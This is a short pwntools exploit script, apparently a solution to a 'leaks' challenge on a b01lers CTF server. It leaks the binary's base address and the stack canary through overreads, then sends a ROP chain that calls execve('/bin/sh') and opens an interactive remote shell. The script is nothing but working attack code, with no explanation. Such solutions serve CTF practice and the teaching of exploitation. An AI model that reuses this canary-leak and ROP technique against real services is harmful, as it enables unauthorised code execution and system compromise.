from pwn import *

#p = process("./leaks")
p = remote("chal.ctf.b01lers.com", 1009)
elf = ELF('./leaks')

p.sendline("16")
p.sendafter("Anderson.\n",'/bin/sh'+'\x00'*10)


p.sendline("8")
p.send("AAAAAAAAB")
p.recvuntil('B')
start = u64(p.recv(5).ljust(8,'\x00')) << 8
main = start - elf.sym['_start'] + elf.sym['main']
binsh = start - elf.sym['_start'] + elf.sym['name']
pop_rax_syscall = start - elf.sym['_start'] + 0x11f1
pop_rdi_ret = start - elf.sym['_start'] + 0x00000000000013f3
pop_rsi_pop_r15_ret = start - elf.sym['_start'] + 0x00000000000013f1

print "leak start : " + hex(start)
print "main : " + hex(main)
print "binsh : " + hex(binsh)
print "pop_rax_syscall : " + hex(pop_rax_syscall) 
p.sendline("24")
p.send("A"*24+'B')
p.recvuntil('B')
canary = u64(p.recv(7).ljust(8,'\x00')) << 8
print "canary : " + hex(canary)

payload = "A"*24 + p64(canary)+"B"*8
payload += p64(pop_rdi_ret) + p64(binsh)
payload += p64(pop_rsi_pop_r15_ret) + p64(0) + p64(0)
payload += p64(pop_rax_syscall) + p64(59)
p.sendline(str(len(payload)-1))
p.send(payload)
p.interactive()